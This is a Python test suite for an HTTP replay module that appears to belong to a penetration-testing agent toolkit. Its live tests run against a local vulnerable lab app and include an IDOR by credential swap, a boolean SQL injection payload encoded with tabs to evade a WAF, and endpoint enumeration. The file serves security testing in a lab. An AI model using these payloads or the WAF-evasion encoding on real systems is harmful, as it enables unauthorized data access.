"""Wave 1 gym — http_replay: mutations-as-data, codec pipelines, credential
swap, compare-mode 3-gate evidence, sweep, raw bytes, scope + budget guards.
Unit layer + live Citadel proof (IDOR via credential swap, WAF-evading SQLi
via codec, sibling sweep)."""

import json
import os
import signal
import subprocess
import sys
import time
from pathlib import Path

import pytest
import requests

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from suijin.modules.tools.lib.http_replay import (  # noqa: E402
    _BUDGET,
    _diff,
    apply_codec,
    apply_credential,
    apply_mutation,
    http_replay,
    http_replay_raw,
    list_credentials,
    register_credential,
)

PUB = 5982
BASE = f"http://127.0.0.1:{PUB}"


# ── unit: mutations ──────────────────────────────────────────────────
class TestMutations:
    def _req(self):
        return {"method": "GET", "url": "http://t/api/x?id=1", "headers": {"Authorization": "Bearer A", "X-Misc": "1"},
                "body": '{"a": 1, "nested": {"b": 2}}', "cookies": ""}

    def test_set_query_replaces(self):
        r = apply_mutation(self._req(), "set-query", "id", "2")
        assert "id=2" in r["url"] and "id=1" not in r["url"]

    def test_add_query_hpp(self):
        r = apply_mutation(self._req(), "add-query", "id", "2")
        assert r["url"].count("id=") == 2  # ?id=1&id=2 — HPP primitive

    def test_remove_query(self):
        r = apply_mutation(self._req(), "remove-query", "id")
        assert "id=" not in r["url"]

    def test_headers(self):
        r = apply_mutation(self._req(), "set-header", "X-Test", "v")
        assert r["headers"]["X-Test"] == "v"
        r = apply_mutation(self._req(), "add-header", "X-Misc", "2")
        assert r["headers"]["X-Misc"] == "1, 2"
        r = apply_mutation(self._req(), "remove-header", "Authorization")
        assert "Authorization" not in r["headers"]

    def test_body_dot_paths(self):
        r = apply_mutation(self._req(), "body-set-field", "nested.c", "7")
        assert json.loads(r["body"])["nested"]["c"] == 7  # JSON-parsed value
        r = apply_mutation(self._req(), "body-set-field", "role", "admin")
        assert json.loads(r["body"])["role"] == "admin"
        r = apply_mutation(self._req(), "body-remove-field", "a")
        assert "a" not in json.loads(r["body"])
        r = apply_mutation(self._req(), "body-merge", "", {"x": 1})
        assert json.loads(r["body"])["x"] == 1

    def test_target_and_path_param(self):
        r = apply_mutation(self._req(), "set-target", "", "/api/y")
        assert "/api/y" in r["url"]
        base = {"method": "GET", "url": "http://t/modals/{name}", "headers": {}, "body": "", "cookies": ""}
        r = apply_mutation(base, "set-path-param", "name", "settings")
        assert r["url"].endswith("/modals/settings")

    def test_raw_values_never_reencoded(self):
        r = apply_mutation(self._req(), "set-body", "", "' union/**/select 1--")
        assert r["body"] == "' union/**/select 1--"

    def test_tab_codec(self):
        # full wire form: url-encode with %09 as the space escape
        assert apply_codec("a' OR 1=1", ["tab"]) == "a%27%09OR%091%3D1"

    def test_unknown_op_is_clean_error(self):
        with pytest.raises(ValueError):
            apply_mutation(self._req(), "nuke", "", "")


# ── unit: codecs ─────────────────────────────────────────────────────
class TestCodecs:
    def test_pipeline_composition(self):
        assert apply_codec("a b", ["url"]) == "a%20b"
        assert apply_codec("' OR 1=1", ["url", "url"]) == apply_codec("' OR 1=1", ["url-double"])
        assert apply_codec("XSS", ["base64"]) == "WFNT"
        assert apply_codec("<", ["html-dec"]) == "&#60;"
        assert apply_codec("é", ["unicode"]).startswith("\\u")

    def test_roundtrip_shape(self):
        assert apply_codec("abc", []) == "abc"

    def test_unknown_codec_raises(self):
        with pytest.raises(ValueError):
            apply_codec("x", ["nope"])


# ── unit: credential swap ────────────────────────────────────────────
class TestCredentialSwap:
    def test_swap_strips_all_common_auth(self):
        register_credential("alice", headers={"Authorization": "Bearer ALICE", "X-Session": "tok-a"})
        r = apply_credential({"url": "http://t/x", "headers": {
            "Authorization": "Bearer BOB", "Cookie": "sess=bob", "X-Api-Key": "k",
            "X-Access-Token": "t", "X-Session-Token": "s", "X-Csrf-Token": "c",
            "X-Auth-Token": "a", "Content-Type": "application/json",
        }, "body": "", "cookies": ""}, "alice")
        lower = {k.lower() for k in r["headers"]}
        assert "cookie" not in lower and "x-api-key" not in lower and "x-csrf-token" not in lower
        assert r["headers"]["Authorization"] == "Bearer ALICE"
        assert r["headers"]["Content-Type"] == "application/json"  # non-auth headers survive

    def test_unauthenticated_strips_everything(self):
        r = apply_credential({"url": "http://t/x", "headers": {"Authorization": "B"}, "body": "", "cookies": ""}, None)
        assert r["headers"] == {}

    def test_unknown_credential_names_known(self):
        with pytest.raises(ValueError):
            apply_credential({"url": "http://t/x", "headers": {}, "body": "", "cookies": ""}, "ghost")

    def test_cookies_injected(self):
        register_credential("bob", cookies="sess=bobtok")
        r = apply_credential({"url": "http://t/x", "headers": {}, "body": "", "cookies": ""}, "bob")
        assert r["headers"]["Cookie"] == "sess=bobtok"


# ── unit: diff (Gate 3) ──────────────────────────────────────────────
class TestDiff:
    def test_identical_is_not_a_finding(self):
        d = _diff({"status": 200, "body": "x", "ms": 10}, {"status": 200, "body": "x", "ms": 12})
        assert "NOT a finding" in d["verdict_hint"]

    def test_difference_is_evidence(self):
        d = _diff({"status": 200, "body": "x"}, {"status": 200, "body": "SECRET"})
        assert "evidence" in d["verdict_hint"]
        assert not d["content_match"]


# ── unit: guards ─────────────────────────────────────────────────────
class TestGuards:
    def test_private_target_refused_without_flag(self):
        out = http_replay(url="http://127.0.0.1:1/x")
        assert "allow_internal" in out

    def test_missing_url_is_clean_error(self):
        assert http_replay().startswith("Error")

    def test_unknown_request_id(self):
        assert "not found" in http_replay(request_id="r9999999999", allow_internal=True)


# ── live: Citadel proof ──────────────────────────────────────────────
def _kill_port(port):
    try:
        out = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True).stdout.strip()
        for pid in out.splitlines():
            subprocess.run(["kill", "-9", pid], capture_output=True)
    except Exception:
        pass


@pytest.fixture(scope="module")
def citadel():
    _kill_port(PUB)
    app_py = str(Path(__file__).resolve().parents[2] / "lab" / "citadel" / "app.py")
    proc = subprocess.Popen(
        [sys.executable, app_py],
        env={**os.environ, "PORT": str(PUB), "CITADEL_DB": "/tmp/suijin_replay_test.db",
             "CITADEL_TRAFFIC": "/tmp/replay_test_traffic.jsonl", "CITADEL_RATE_LIMIT": "100000",
             "CITADEL_NO_INTERNAL": "1"},
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    for _ in range(40):
        try:
            if requests.get(f"{BASE}/health", timeout=1).status_code == 200:
                break
        except Exception:
            time.sleep(0.25)
    else:
        proc.terminate()
        pytest.fail("citadel did not boot")
    _BUDGET["remaining"] = 5000
    yield proc
    proc.send_signal(signal.SIGTERM)
    time.sleep(0.5)
    _kill_port(PUB)


def _login_as(user, pw):
    """replay-mode login: returns the session token (the agent's flow)."""
    out = http_replay(
        method="POST", url=f"{BASE}/login", allow_internal=True,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=f"u={user}&p={pw}",
    )
    return json.loads(out)


class TestCitadelReplay:
    def test_credential_swap_idor_with_3gate_diff(self, citadel):
        # register two credentials by logging in through the engine itself
        ceo = _login_as("ceo", "Zx!9topSecret")
        assert ceo.get("status") == 200, ceo
        register_credential("ceo", headers={"X-Session": json.loads(ceo["body"])["token"]})
        alice = _login_as("alice", "alice123")
        assert alice.get("status") == 200
        register_credential("alice", headers={"X-Session": json.loads(alice["body"])["token"]})

        out = http_replay(
            url=f"{BASE}/api/docs/d-8b2e40d1", allow_internal=True, credential="alice",
            compare={"credential": "ceo"},  # baseline alice vs exploit ceo
        )
        res = json.loads(out)
        assert res["mode"] == "compare"
        assert res["baseline"]["status"] == 403  # alice denied
        assert res["exploit"]["status"] == 200  # ceo reads it
        assert "FLAG{citadel_idor_docs}" in res["exploit"]["body"]
        assert not res["diff"]["content_match"]
        assert "evidence" in res["diff"]["verdict_hint"]
        assert "curl" in res and "-X GET" in res["curl"]

    def test_codec_pipeline_delivers_waf_evasive_sqli(self, citadel):
        # plain boolean SQLi is WAF'd (fake-404); url-double encoding sails through
        plain = http_replay(
            method="GET", url=f"{BASE}/api/items", allow_internal=True,
            mutations=[{"op": "set-query", "field": "category", "value": "hardware' OR 1=1 -- "}],  # the WAF-matching form (+ terminator)
        )
        assert json.loads(plain).get("status") == 404  # the WAF ate it
        evaded = http_replay(
            method="GET", url=f"{BASE}/api/items", allow_internal=True,
            mutations=[{"op": "set-query", "field": "category", "value": "hardware' OR 1=1 -- "}],
            codec=["tab"], codec_field="category",  # %09 slips the separator class; SQLite eats tabs
        )
        res = json.loads(evaded)
        assert res.get("status") == 200, res
        assert len(json.loads(res["body"])) >= 2  # boolean TRUE row set

    def test_sweep_sibling_enumeration(self, citadel):
        out = http_replay(
            url=f"{BASE}/api/v2", allow_internal=True,
            sweep={"op": "set-target", "field": "", "values": ["/api/v2/health", "/api/v2/executive", "/api/v2/ghost"]},
        )
        res = json.loads(out)
        statuses = {r["value"]: r["status"] for r in res["results"]}
        assert statuses["/api/v2/health"] == 200
        assert statuses["/api/v2/ghost"] == 404  # the sweep found what exists

    def test_error_signatures_flag_sqli(self, citadel):
        out = http_replay(
            method="GET", url=f"{BASE}/api/items", allow_internal=True,
            mutations=[{"op": "set-query", "field": "category", "value": "hardware'"}],
        )
        assert "sqli_sqlite" in json.loads(out).get("error_signatures", [])

    def test_raw_mode_gets_bytes(self, citadel):
        out = http_replay_raw(host="127.0.0.1", port=PUB, tls=False,
                              data=f"GET /health HTTP/1.1\r\nHost: 127.0.0.1:{PUB}\r\nConnection: close\r\n\r\n")
        res = json.loads(out)
        assert res["mode"] == "raw" and "200 OK" in res["response_head"]

    def test_list_credentials_roundtrip(self, citadel):
        out = list_credentials()
        assert "ceo" in out and "alice" in out
